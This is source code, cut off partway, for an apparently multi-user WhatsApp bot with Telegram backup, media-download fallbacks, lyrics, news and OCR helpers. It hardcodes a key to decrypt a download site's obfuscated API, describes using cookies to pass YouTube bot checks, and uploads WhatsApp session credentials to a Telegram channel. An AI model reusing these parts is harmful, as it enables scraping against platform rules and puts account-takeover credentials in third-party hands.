const fs = require('fs');
const path = require('path');
const https = require('https');

// Resolve legacy 'baileys' imports to @whiskeysockets/baileys.
const Module = require('module');
const _origResolve = Module._resolveFilename;
Module._resolveFilename = function (request, ...rest) {
  if (request === 'baileys') return _origResolve('@whiskeysockets/baileys', ...rest);
  return _origResolve(request, ...rest);
};

const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, generateWAMessageFromContent, proto, downloadContentFromMessage, getContentType } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const qrcode = require('qrcode');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const AdmZip = require('adm-zip');
const pino = require('pino');
const { sendInteractiveMessage } = require('@ryuu-reinzz/button-helper');
let _wbailsGen = null, _wbailsUnix = null;
try {
    const wbUtils = require('@zeppeliorg/wbails/lib/Utils');
    _wbailsGen = wbUtils.generateWAMessageFromContent;
    _wbailsUnix = wbUtils.unixTimestampSeconds;
    console.log('[buttons] @zeppeliorg/wbails loaded — engagement nodes guaranteed');
} catch (e) {
    console.warn('[buttons] @zeppeliorg/wbails NOT available — falling back to button-helper only');
}

// Optional Baileys poll vote aggregation helper.
let getAggregateVotesInPollMessage = null;
try {
  const baileys = require('@whiskeysockets/baileys');
  getAggregateVotesInPollMessage = baileys.getAggregateVotesInPollMessage;
  console.log('[poll] Advanced poll vote helper loaded');
} catch (_) {
  try {
    const baileys = require('@whiskeysockets/baileys');
    getAggregateVotesInPollMessage = baileys.getAggregateVotesInPollMessage;
  } catch (_) {}
}

// Core configuration
const AUTH_DIR = 'auth_info';
const PERSONA_FILE = 'menu_theme.json';
const PORT = process.env.PORT || 5000;
const USERS_FILE = 'web_users.json';
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || null;
let webhookSecret = null;
const TELEGRAM_BACKUP_CHANNEL = process.env.TELEGRAM_BACKUP_CHANNEL || null;
const CUSTOM_PAIR_CODE = process.env.CUSTOM_PAIR_CODE || null;

let backupInProgress = false;
let lastBackupTime = 0;
const BACKUP_DEBOUNCE_MS = 15000;
let socketGeneration = 0;
const MAX_CONSECUTIVE_FAILURES = 30;
const socketRuntime = new Map(); // per-session reconnect/generation state
function getSocketRuntime(sessionKey = 'main') {
  const key = sessionKey || 'main';
  if (!socketRuntime.has(key)) socketRuntime.set(key, { generation: 0, consecutiveFailures: 0, reconnectTimer: null });
  return socketRuntime.get(key);
}
let isPairing = false;
const pairingInProgress = new Set();
let botStartTime = Date.now();
let successfulPairings = 0;
const SESSION_FILE = 'sessions.json';

// ═══════════════════════════════════════════════════════════════════════
// ══ DOWNLOADER HELPERS (multi-tier fallbacks for reliability) ═══════════
// ═══════════════════════════════════════════════════════════════════════
//
// Why these exist: cobalt.tools (the original primary) often blocks
// cloud datacenter IPs (Render, Railway, Fly, etc.), and ytdl-core is
// largely abandoned. So we fall back through a chain:
//
//   1. cobalt.tools (with retries across multiple instances)
//   2. piped.video API  (YouTube only, doesn't block cloud IPs)
//   3. ytdl-core        (YouTube only, returns buffer directly)
//
// All failures gracefully degrade to a link + metadata message.
//

// ── TIER 0: LOCAL COBALT (self-hosted on your VPS) ───────────────────────
// If you set up cobalt on your VPS via setup-cobalt.sh, point the bot at it
// with these env vars. Local cobalt is the FASTEST and MOST RELIABLE tier
// because it has a residential/datacenter IP that YouTube won't have blocked.
// Supports YouTube, TikTok, Instagram, Facebook, Twitter/X, Pinterest,
// Reddit, Vimeo, SoundCloud, Bluesky, Snapchat, +10 more platforms.
const COBALT_LOCAL_URL = process.env.COBALT_LOCAL_URL || null;
const COBALT_LOCAL_KEY = process.env.COBALT_LOCAL_KEY || null;

async function _ph_tryLocalCobalt(url, isAudio) {
  if (!COBALT_LOCAL_URL) return null;
  try {
    const payload = {
      url,
      videoQuality: '720',
      audioFormat: isAudio ? 'mp3' : 'best',
      filenameStyle: 'classic',
      downloadMode: isAudio ? 'audio' : 'auto',
      youtubeVideoCodec: 'h264',
      alwaysProxy: true,
      disableMetadata: false,
    };
    const headers = {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'User-Agent': BROWSER_UA,
    };
    if (COBALT_LOCAL_KEY) headers['Authorization'] = `Bearer ${COBALT_LOCAL_KEY}`;

    const buf = await _ph_httpsRequest({
      hostname: new URL(COBALT_LOCAL_URL).hostname,
      path: new URL(COBALT_LOCAL_URL).pathname || '/',
      method: 'POST',
      headers: { ...headers, 'Content-Length': Buffer.byteLength(JSON.stringify(payload)) },
      timeout: 60000,  // 60s — cobalt takes time to resolve media
    }, JSON.stringify(payload));

    let result;
    try { result = JSON.parse(buf.toString('utf8')); }
    catch (_) { console.log(`[dl] local cobalt returned non-JSON`); return null; }

    const mediaUrl = result.url || (result.picker && result.picker[0] && result.picker[0].url) || null;
    const okStatuses = ['tunnel', 'redirect', 'stream'];
    if (okStatuses.includes(result.status) && mediaUrl) {
      console.log(`[dl] ✅ local cobalt (${new URL(COBALT_LOCAL_URL).hostname}) → ${result.status}`);
      return mediaUrl;
    }
    console.log(`[dl] ⚠️ local cobalt status=${result.status} err=${JSON.stringify(result.error || result.text || '').slice(0,100)}`);
  } catch (e) {
    console.log(`[dl] ⚠️ local cobalt failed: ${e.message?.slice(0, 120)}`);
  }
  return null;
}

// ── TIER 1: PUBLIC COBALT INSTANCES (often blocked on cloud IPs) ───────
const COBALT_INSTANCES = [
  'https://api.cobalt.tools/',            // v7 format (POST / with new schema)
  'https://api.cobalt.tools/api/json',    // legacy format (POST /api/json with old schema)
  'https://co.wuk.sh/api/json',
  'https://cobalt-api.kavin.rocks/api/json',
  'https://api.cobalt-7.wireway.ch/api/json'
];
const PIPED_INSTANCES = [
  'pipedapi.kavin.rocks',
  'pipedapi.adminforge.de',
  'pipedapi.astartes.nl',
  'pipedapi.privacy.com.de',
  'piped-api.lunar.rip',
  'pipedapi-libre.kavin.rocks'
];

// yt-dlp cookie support for cloud hosts hit by YouTube bot checks.
// Set ONE of these env vars on Render if YouTube says "not a bot":
//   YTDLP_COOKIES_PATH=/path/to/cookies.txt
//   YTDLP_COOKIES_B64=<base64 netscape cookies.txt>
//   YTDLP_COOKIES=<raw netscape cookies.txt>
const YTDLP_COOKIE_FILE = path.join(require('os').tmpdir(), 'eventide-ytdlp-cookies.txt');
const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
const MAX_DOWNLOAD_BYTES = 80 * 1024 * 1024; // 80MB cap — protects Render memory

// Download and media helpers
function _ph_currentPersona(sock) {
  try {
    if (!sock?.user?.id) return 'eclipse';
    const ownerNum = normalizeNum(sock.user.id.split(':')[0].split('@')[0]);
    return getBotPersonaByOwner(ownerNum);
  } catch (_) { return 'eclipse'; }
}

function _ph_extractYouTubeId(url) {
  const m = String(url || '').match(/(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/shorts\/|youtube\.com\/embed\/|m\.youtube\.com\/watch\?v=)([a-zA-Z0-9_-]{11})/);
  return m ? m[1] : null;
}

function _ph_extractDomain(url) {
  try { return new URL(url).hostname.replace(/^www\./, ''); } catch (_) { return 'unknown'; }
}

function _ph_safeFilename(s) {
  return String(s || 'media').replace(/[^\w\s.\-]/g, '_').replace(/\s+/g, '_').slice(0, 80);
}

function _ph_personaHeader(persona, title, body) {
  const isAst = persona === 'astraea';
  const theme = isAst ? '☀️' : '🌑';
  const sysname = isAst ? 'ASTRAEA · DIVINE SYSTEM' : 'ECLIPSE · VOID CORE';
  return (
    `${theme} *${title}*\n` +
    `╭─────────────────────────────╮\n` +
    body + `\n` +
    `╰─────────────────────────────╯\n` +
    `— *${sysname}* · 👁`
  );
}

function _ph_httpsRequest(opts, postBody) {
  return new Promise((resolve, reject) => {
    const req = https.request(opts, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        try {
          const u = new URL(res.headers.location, `https://${opts.hostname}`);
          return resolve(_ph_httpsRequest({
            hostname: u.hostname,
            path: u.pathname + u.search,
            method: opts.method || 'GET',
            headers: opts.headers,
            timeout: opts.timeout
          }, postBody));
        } catch (e) { return reject(new Error('Bad redirect')); }
      }
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => {
        if (res.statusCode >= 400) return reject(new Error(`HTTP ${res.statusCode}`));
        resolve(Buffer.concat(chunks));
      });
    });
    req.on('error', reject);
    if (opts.timeout) req.setTimeout(opts.timeout, () => req.destroy(new Error('Timeout')));
    if (postBody) req.write(postBody);
    req.end();
  });
}

// ── Detect platform from URL ────────────────────────────────────────────
function _ph_detectPlatform(url) {
  const u = String(url || '').toLowerCase();
  if (/(?:youtube\.com|youtu\.be|yt\.be|ytmusic\.com|music\.youtube\.com)/.test(u)) return 'youtube';
  if (/(?:tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/.test(u)) return 'tiktok';
  if (/(?:instagram\.com|instagr\.am)/.test(u)) return 'instagram';
  if (/(?:facebook\.com|fb\.watch|fb\.com)/.test(u)) return 'facebook';
  if (/(?:twitter\.com|x\.com|t\.co)/.test(u)) return 'twitter';
  if (/(?:soundcloud\.com|sc\.com)/.test(u)) return 'soundcloud';
  if (/(?:pinterest\.com|pin\.it)/.test(u)) return 'pinterest';
  if (/(?:reddit\.com|redd\.it)/.test(u)) return 'reddit';
  if (/(?:tumblr\.com)/.test(u)) return 'tumblr';
  if (/(?:vimeo\.com)/.test(u)) return 'vimeo';
  if (/(?:twitch\.tv)/.test(u)) return 'twitch';
  return 'generic';
}

// ── TIER 0: TIKWM (TikTok HD no-watermark, free, no key) ────────────────
// Most reliable for TikTok — has its own infrastructure that bypasses
// TikTok's anti-bot. Always returns hdplay (HD no-watermark) or play
// (SD no-watermark). NEVER uses wmplay (watermark).
async function _ph_tryTikwm(url) {
  try {
    const u = new URL('https://www.tikwm.com/api/');
    u.searchParams.set('url', url);
    u.searchParams.set('hd', '1');
    const buf = await _ph_httpsRequest({
      hostname: u.hostname,
      path: u.pathname + u.search,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
      timeout: 30000,
    });
    let data;
    try { data = JSON.parse(buf.toString('utf8')); }
    catch (_) { console.log(`[dl] ⚠️ tikwm returned non-JSON`); return null; }
    if (!data || data.code !== 0 || !data.data) {
      console.log(`[dl] ⚠️ tikwm: ${data?.msg || 'empty data'}`);
      return null;
    }
    const d = data.data;
    // Prefer HD no-watermark, fall back to SD no-watermark
    const v = d.hdplay || d.play;
    if (!v) { console.log(`[dl] ⚠️ tikwm: no playable video`); return null; }
    console.log(`[dl] ✅ tikwm → ${d.hdplay ? 'HD' : 'SD'} no-watermark`);
    return { type: 'video', url: v, title: d.title, thumb: d.cover };
  } catch (e) {
    console.log(`[dl] ⚠️ tikwm failed: ${e.message?.slice(0, 120)}`);
    return null;
  }
}

// ── TIER 1: LOCOLOADER (TikTok/Instagram fallback, free, no key) ────────
// Secondary fallback for TikTok + Instagram. Different infra from tikwm
// so if one is down the other usually works.
async function _ph_tryLocoloader(url) {
  try {
    const u = new URL('https://locoloader.com/api/v2/social');
    u.searchParams.set('url', url);
    const buf = await _ph_httpsRequest({
      hostname: u.hostname,
      path: u.pathname + u.search,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
      timeout: 25000,
    });
    let data;
    try { data = JSON.parse(buf.toString('utf8')); }
    catch (_) { console.log(`[dl] ⚠️ locoloader returned non-JSON`); return null; }
    if (!data || data.error) {
      console.log(`[dl] ⚠️ locoloader: ${data?.message || 'error'}`);
      return null;
    }
    if (data.video) { console.log(`[dl] ✅ locoloader → video`); return { type: 'video', url: data.video, title: data.title }; }
    if (data.image) { console.log(`[dl] ✅ locoloader → image`); return { type: 'image', url: data.image, title: data.title }; }
    if (data.audio) { console.log(`[dl] ✅ locoloader → audio`); return { type: 'audio', url: data.audio, title: data.title }; }
    console.log(`[dl] ⚠️ locoloader: no media in response`);
    return null;
  } catch (e) {
    console.log(`[dl] ⚠️ locoloader failed: ${e.message?.slice(0, 120)}`);
    return null;
  }
}

// Tier 1: cobalt.tools — tries multiple instances, returns media URL or null
async function _ph_tryCobalt(url, isAudio) {
  // Cobalt payload. Public instances may reject unsupported keys with HTTP 400,
  // so keep it close to the documented API and only request audio mode when needed.
  const payload = JSON.stringify({
    url,
    videoQuality: '720',
    audioFormat: isAudio ? 'mp3' : 'best',
    audioBitrate: '128',
    filenameStyle: 'classic',
    downloadMode: isAudio ? 'audio' : 'auto',
    youtubeVideoCodec: 'h264',
    alwaysProxy: true,
    disableMetadata: false,
    tiktokFullAudio: true,
    youtubeHLS: false
  });

  for (const endpoint of COBALT_INSTANCES) {
    try {
      const u = new URL(endpoint);
      const buf = await _ph_httpsRequest({
        hostname: u.hostname,
        path: u.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
          'User-Agent': BROWSER_UA,
          'Content-Length': Buffer.byteLength(payload)
        },
        timeout: 30000
      }, payload);

      let result;
      try { result = JSON.parse(buf.toString('utf8')); }
      catch (_) { console.log(`[dl] ${u.hostname} returned non-JSON`); continue; }

      const mediaUrl = result.url || (result.picker && result.picker[0] && result.picker[0].url) || null;
      const okStatuses = ['tunnel', 'redirect', 'stream'];
      if (okStatuses.includes(result.status) && mediaUrl) {
        console.log(`[dl] ✅ cobalt (${u.hostname}) → ${result.status}`);
        return mediaUrl;
      }
      console.log(`[dl] ⚠️ cobalt (${u.hostname}) status=${result.status} err=${JSON.stringify(result.error || result.text || '').slice(0,100)}`);
    } catch (e) {
      console.log(`[dl] ⚠️ cobalt (${endpoint}) failed: ${e.message}`);
    }
  }
  return null;
}

// Tier 2: piped.video — YouTube only, alternative frontend, doesn't block cloud IPs
async function _ph_tryPiped(videoId, isAudio) {
  for (const host of PIPED_INSTANCES) {
    try {
      const buf = await _ph_httpsRequest({
        hostname: host,
        path: `/streams/${videoId}`,
        method: 'GET',
        headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
        timeout: 20000
      });

      let result;
      try { result = JSON.parse(buf.toString('utf8')); }
      catch (_) { continue; }

      if (isAudio) {
        // Prefer mp4a (m4a) over webm for WhatsApp compatibility
        const audio = (result.audioStreams || []).find(s => s.mimeType?.includes('mp4') || s.mimeType?.includes('audio/mp4'))
                   || (result.audioStreams || []).find(s => s.mimeType?.includes('webm'))
                   || (result.audioStreams || [])[0];
        if (audio?.url) {
          console.log(`[dl] ✅ piped (${host}) → audio ${audio.quality || ''}`);
          return audio.url;
        }
      } else {
        // Prefer 720p mp4, fall back to anything
        const video = (result.videoStreams || []).find(s => s.quality?.includes('720') && s.mimeType?.includes('mp4'))
                   || (result.videoStreams || []).find(s => s.quality?.includes('480'))
                   || (result.videoStreams || [])[0];
        if (video?.url) {
          console.log(`[dl] ✅ piped (${host}) → video ${video.quality || ''} ${video.mimeType || ''}`);
          return video.url;
        }
      }
    } catch (e) {
      console.log(`[dl] ⚠️ piped (${host}) failed: ${e.message}`);
    }
  }
  return null;
}


function _ph_decodeSaveTubePayload(enc) {
  const { createDecipheriv } = require('crypto');
  const secretKey = 'C5D58EF67A7584E4A29F6C35BBC4EB12';
  const data = Buffer.from(enc, 'base64');
  const iv = data.slice(0, 16);
  const content = data.slice(16);
  const key = Buffer.from(secretKey, 'hex');
  const decipher = createDecipheriv('aes-128-cbc', key, iv);
  return JSON.parse(Buffer.concat([decipher.update(content), decipher.final()]).toString());
}

// Simple website/API based MP3 resolver. This avoids yt-dlp/cobalt/piped/ytdl-core
// for .play and asks SaveTube's public web API for a direct MP3 URL.
async function _ph_trySaveTubeMp3(url, quality = 128) {
  try {
    const cdnBuf = await _ph_httpsRequest({
      hostname: 'media.savetube.vip',
      path: '/api/random-cdn',
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Referer': 'https://save-tube.com/', 'Accept': 'application/json' },
      timeout: 30000
    });
    const cdn = JSON.parse(cdnBuf.toString('utf8'))?.cdn;
    if (!cdn) throw new Error('No SaveTube CDN returned');

    const infoPayload = JSON.stringify({ url });
    const infoBuf = await _ph_httpsRequest({
      hostname: cdn,
      path: '/v2/info',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': BROWSER_UA,
        'Referer': 'https://save-tube.com/',
        'Content-Length': Buffer.byteLength(infoPayload)
      },
      timeout: 30000
    }, infoPayload);
    const infoJson = JSON.parse(infoBuf.toString('utf8'));
    const info = _ph_decodeSaveTubePayload(infoJson.data);
    if (!info?.key) throw new Error('No SaveTube key returned');

    const dlPayload = JSON.stringify({ downloadType: 'audio', quality: String(quality), key: info.key });
    const dlBuf = await _ph_httpsRequest({
      hostname: cdn,
      path: '/download',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': BROWSER_UA,
        'Referer': 'https://save-tube.com/',
        'Content-Length': Buffer.byteLength(dlPayload)
      },
      timeout: 30000
    }, dlPayload);
    const dlJson = JSON.parse(dlBuf.toString('utf8'));
    const downloadUrl = dlJson?.data?.downloadUrl;
    if (!downloadUrl) throw new Error('No SaveTube MP3 URL returned');
    console.log('[play] ✅ savetube mp3 url resolved');
    return {
      url: downloadUrl,
      title: info.title,
      thumbnail: info.thumbnail || info.image,
      filename: `${_ph_safeFilename(info.title || 'audio')}-${quality}.mp3`,
      source: 'savetube'
    };
  } catch (e) {
    console.log(`[play] ⚠️ savetube failed: ${e.message}`);
    return null;
  }
}

// ── TEXT HELPERS ───────────────────────────────────────────────────────
// Split long text into chunks that fit WhatsApp's message length limit
function _ph_chunkText(text, maxLen = 3500) {
  const lines = String(text || '').split('\n');
  const chunks = [];
  let current = '';
  for (const line of lines) {
    if ((current + '\n' + line).length > maxLen) {
      if (current) chunks.push(current);
      current = line;
    } else {
      current = current ? current + '\n' + line : line;
    }
  }
  if (current) chunks.push(current);
  return chunks;
}

// Decode XML entities (for RSS parsing)
function _ph_decodeXml(s) {
  return String(s || '')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&amp;/g, '&')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&apos;/g, "'");
}

// Simple RSS parser for Google News (no npm dep)
function _ph_parseRss(xml) {
  const items = [];
  const itemRegex = /<item>([\s\S]*?)<\/item>/g;
  let match;
  while ((match = itemRegex.exec(xml)) !== null) {
    const x = match[1];
    const title = (x.match(/<title>([\s\S]*?)<\/title>/) || [])[1] || '';
    const link = (x.match(/<link>([\s\S]*?)<\/link>/) || [])[1] || '';
    const pubDate = (x.match(/<pubDate>([\s\S]*?)<\/pubDate>/) || [])[1] || '';
    const source = (x.match(/<source[^>]*>([\s\S]*?)<\/source>/) || [])[1] || '';
    items.push({
      title: _ph_decodeXml(title),
      link: _ph_decodeXml(link),
      pubDate,
      source: _ph_decodeXml(source)
    });
  }
  return items;
}

// ── LYRICS — LRCLIB + lyrics.ovh fallback (free, no key) ───────────────
function _ph_cleanSyncedLyrics(s) {
  return String(s || '').replace(/^\s*\[\d{1,2}:\d{2}(?:\.\d{1,3})?\]\s*/gm, '').trim();
}

async function _ph_searchLrcLibLyrics(query, artist = '', title = '') {
  try {
    const qs = artist && title
      ? `track_name=${encodeURIComponent(title)}&artist_name=${encodeURIComponent(artist)}`
      : `q=${encodeURIComponent(query)}`;
    const buf = await _ph_httpsRequest({
      hostname: 'lrclib.net',
      path: `/api/search?${qs}`,
      method: 'GET',
      headers: {
        'User-Agent': 'EventideOmega/1.0 (https://github.com/Phantom-Dev-X/eventide-omega)',
        'Accept': 'application/json'
      },
      timeout: 20000
    });
    const results = JSON.parse(buf.toString('utf8'));
    if (!Array.isArray(results) || !results.length) return null;
    const hit = results.find(r => (r.plainLyrics || r.syncedLyrics) && !r.instrumental) || results[0];
    const lyrics = hit.plainLyrics || _ph_cleanSyncedLyrics(hit.syncedLyrics);
    if (!lyrics) return null;
    console.log(`[lyrics] ✅ LRCLIB hit: ${hit.artistName} - ${hit.trackName}`);
    return {
      lyrics,
      title: hit.trackName || title || query,
      artist: hit.artistName || artist || 'Unknown',
      album: hit.albumName || '',
      duration: hit.duration || null,
      source: 'LRCLIB'
    };
  } catch (e) {
    console.log('[lyrics] LRCLIB failed:', e.message);
    return null;
  }
}

// ── LYRICS — lyrics.ovh fallback (free, no key) ───────────────────────
async function _ph_searchLyrics(query) {
  try {
    const buf = await _ph_httpsRequest({
      hostname: 'api.lyrics.ovh',
      path: `/suggest/${encodeURIComponent(query)}`,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
      timeout: 15000
    });
    const result = JSON.parse(buf.toString('utf8'));
    return result.data || [];
  } catch (e) {
    console.log('[lyrics] suggest failed:', e.message);
    return [];
  }
}

async function _ph_getLyrics(artist, title) {
  try {
    const buf = await _ph_httpsRequest({
      hostname: 'api.lyrics.ovh',
      path: `/v1/${encodeURIComponent(artist)}/${encodeURIComponent(title)}`,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
      timeout: 20000
    });
    const result = JSON.parse(buf.toString('utf8'));
    return result.lyrics || '';
  } catch (e) {
    console.log('[lyrics] fetch failed:', e.message);
    return '';
  }
}

// ── DEFINE — dictionaryapi.dev (free, no key) ──────────────────────────
async function _ph_define(word) {
  try {
    const buf = await _ph_httpsRequest({
      hostname: 'api.dictionaryapi.dev',
      path: `/api/v2/entries/en/${encodeURIComponent(word)}`,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
      timeout: 15000
    });
    const result = JSON.parse(buf.toString('utf8'));
    return Array.isArray(result) ? result : null;
  } catch (e) {
    console.log('[define] failed:', e.message);
    return null;
  }
}

// ── TRIVIA — Open Trivia DB (free, no key) ─────────────────────────────
async function _ph_triviaQuestion(category, difficulty) {
  try {
    let path = `/api.php?amount=1&type=multiple&difficulty=${difficulty}&encode=url3986`;
    if (category) path += `&category=${encodeURIComponent(category)}`;
    const buf = await _ph_httpsRequest({
      hostname: 'opentdb.com',
      path,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
      timeout: 15000
    });
    const result = JSON.parse(buf.toString('utf8'));
    if (result.response_code !== 0 || !result.results?.length) return null;
    const q = result.results[0];
    return {
      category: decodeURIComponent(q.category),
      question: decodeURIComponent(q.question),
      correct: decodeURIComponent(q.correct_answer),
      incorrect: (q.incorrect_answers || []).map(a => decodeURIComponent(a)),
      difficulty: q.difficulty
    };
  } catch (e) {
    console.log('[trivia] failed:', e.message);
    return null;
  }
}

// ── SHORTEN — is.gd (free, no key) ─────────────────────────────────────
async function _ph_shortenUrl(url) {
  try {
    const buf = await _ph_httpsRequest({
      hostname: 'is.gd',
      path: `/create.php?format=simple&url=${encodeURIComponent(url)}`,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA },
      timeout: 15000
    });
    const shortUrl = buf.toString('utf8').trim();
    return shortUrl.startsWith('http') ? shortUrl : null;
  } catch (e) {
    console.log('[shorten] failed:', e.message);
    return null;
  }
}

// ── MOVIE — Wikipedia REST API (free, no key) ──────────────────────────
async function _ph_movieWiki(title) {
  try {
    const buf = await _ph_httpsRequest({
      hostname: 'en.wikipedia.org',
      path: `/api/rest_v1/page/summary/${encodeURIComponent(title)}`,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA + ' Phantom-X/1.0 (contact: github.com/phantom-dev-x)', 'Accept': 'application/json' },
      timeout: 15000
    });
    const result = JSON.parse(buf.toString('utf8'));
    if (!result || result.type === 'disambiguation') return null;
    return {
      title: result.title,
      extract: result.extract,
      thumbnail: result.thumbnail?.source || null,
      url: result.content_urls?.desktop?.page || null,
      description: result.description
    };
  } catch (e) {
    console.log('[movie] Wiki failed:', e.message);
    return null;
  }
}

// ── NEWS — Google News RSS (free, no key) + NewsAPI (free key, better) ─
async function _ph_newsGoogle(topic) {
  try {
    const buf = await _ph_httpsRequest({
      hostname: 'news.google.com',
      path: `/rss/search?q=${encodeURIComponent(topic)}&hl=en-US&gl=US&ceid=US:en`,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/rss+xml, application/xml, text/xml' },
      timeout: 15000
    });
    return _ph_parseRss(buf.toString('utf8')).slice(0, 5);
  } catch (e) {
    console.log('[news] Google RSS failed:', e.message);
    return [];
  }
}

async function _ph_newsApi(topic) {
  try {
    const key = process.env.NEWS_API_KEY;
    if (!key) return [];
    const buf = await _ph_httpsRequest({
      hostname: 'newsapi.org',
      path: `/v2/everything?q=${encodeURIComponent(topic)}&pageSize=5&sortBy=publishedAt&apiKey=${key}`,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
      timeout: 15000
    });
    const result = JSON.parse(buf.toString('utf8'));
    if (result.status !== 'ok' || !result.articles) return [];
    return result.articles.map(a => ({
      title: a.title,
      link: a.url,
      pubDate: a.publishedAt,
      source: a.source?.name || 'Unknown'
    }));
  } catch (e) {
    console.log('[news] NewsAPI failed:', e.message);
    return [];
  }
}

// ── OCR — tesseract.js (local OCR via WebAssembly, no API key) ──────────
// Lazy-loaded so the bot doesn't pay the startup cost if OCR is never used.
let _ph_ocrWorker = null;
let _ph_ocrLoading = null;
async function _ph_getOcrWorker() {
  if (_ph_ocrWorker) return _ph_ocrWorker;
  if (_ph_ocrLoading) return _ph_ocrLoading;
  _ph_ocrLoading = (async () => {
    try {
      const { createWorker } = require('tesseract.js');
      const w = await createWorker('eng', 1, {
        // Suppress tesseract.js's internal logging
        logger: () => {}
      });
      _ph_ocrWorker = w;
      console.log('[ocr] ✅ tesseract.js worker ready');
      return w;
    } catch (e) {
      console.log('[ocr] ❌ tesseract.js not available:', e.message);
      _ph_ocrLoading = null;
      throw e;
    }
  })();
  return _ph_ocrLoading;
}

async function _ph_ocrImage(buffer) {
  try {
    const w = await _ph_getOcrWorker();
    const { data } = await w.recognize(buffer);
    return data.text || '';
  } catch (e) {
    console.log('[ocr] failed:', e.message);
    return null;
  }
}

// ── AUTH COMPLETENESS CHECK ────────────────────────────────────────────
// A Baileys auth folder is usable for backup when it has creds.json with
// valid content. We do NOT require app-state-sync-key files because
// Baileys syncs those asynchronously AFTER `connection === 'open'` —
// so immediately after pair success they don't exist yet. If we required
// them, every initial-pair backup would skip the auth folder and the
// bot would be unrecoverable on redeploy.
//
// app-state keys are nice-to-have: Baileys re-syncs them automatically
// on reconnect if missing. creds.json is the only thing that's strictly
// required for WhatsApp to recognize the session.
function _ph_isAuthComplete(authDir) {
  try {
    if (!fs.existsSync(authDir)) return false;
    const stat = fs.statSync(authDir);
    if (!stat.isDirectory()) return false;
    const files = fs.readdirSync(authDir);
    if (files.length === 0) return false;
    if (!files.includes('creds.json')) return false;
    const credsPath = path.join(authDir, 'creds.json');
    const credsStat = fs.statSync(credsPath);
    if (credsStat.size < 100) return false; // too small = stub creds
    try {
      const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
      if (!creds.registered) return false;
    } catch (_) { return false; }
    return true;
  } catch (_) { return false; }
}

// Lightweight check that reports what the auth folder has
// (used by diagnostic logging, doesn't gate backup)
function _ph_authStatus(authDir) {
  try {
    if (!fs.existsSync(authDir)) return { exists: false };
    const files = fs.readdirSync(authDir);
    const hasCreds = files.includes('creds.json');
    const hasKeys = files.some(f => f.startsWith('app-state-sync-key'));
    const credsSize = hasCreds ? fs.statSync(path.join(authDir, 'creds.json')).size : 0;
    return {
      exists: true,
      fileCount: files.length,
      files,
      hasCreds,
      hasKeys,
      credsSize,
      complete: hasCreds && credsSize >= 100
    };
  } catch (e) { return { exists: false, error: e.message }; }
}

// Backup with deferred re-fire — used right after pair success so the
// immediate backup captures creds.json and the delayed one captures the
// app-state-sync-key files Baileys writes asynchronously. The Telegram
// channel pins the latest backup, so the delayed one wins.
function _ph_backupWithSync(label = 'pair') {
  // Immediate — captures whatever exists now (at minimum creds.json)
  backupAuthToChannel(true).catch(e => console.log(`[backup] ${label} immediate failed:`, e.message));
  // Delayed — give Baileys 5s to sync app state, then re-fire
  setTimeout(() => {
    backupAuthToChannel(true).then(() => {
      console.log(`[backup] ${label} delayed backup (post-sync) complete`);
    }).catch(e => console.log(`[backup] ${label} delayed failed:`, e.message));
  }, 5000);
}

// ── WEATHER HELPERS ────────────────────────────────────────────────────
// Geocoding chain: Google Maps (if GOOGLE_MAPS_API_KEY env var is set)
// → Nominatim (OpenStreetMap, free fallback).
// Weather: Open-Meteo (free, no key, takes lat/lng directly).
// Supports: city, city+state+country, street names, full addresses,
// raw "lat,lng" coordinates.

async function _ph_geocodeNominatim(query) {
  try {
    const encoded = encodeURIComponent(query);
    const buf = await _ph_httpsRequest({
      hostname: 'nominatim.openstreetmap.org',
      path: `/search?q=${encoded}&format=json&limit=1&addressdetails=1`,
      method: 'GET',
      headers: {
        'User-Agent': BROWSER_UA + ' Phantom-X/1.0',
        'Accept': 'application/json',
        'Accept-Language': 'en'
      },
      timeout: 15000
    });
    const results = JSON.parse(buf.toString('utf8'));
    if (!results || results.length === 0) return null;
    const r = results[0];
    return {
      lat: parseFloat(r.lat),
      lng: parseFloat(r.lon),
      displayName: r.display_name
    };
  } catch (e) {
    console.log('[weather] Nominatim failed:', e.message);
    return null;
  }
}

async function _ph_geocodeGoogle(query) {
  try {
    const key = process.env.GOOGLE_MAPS_API_KEY;
    if (!key) return null;
    const encoded = encodeURIComponent(query);
    const buf = await _ph_httpsRequest({
      hostname: 'maps.googleapis.com',
      path: `/maps/api/geocode/json?address=${encoded}&key=${key}`,
      method: 'GET',
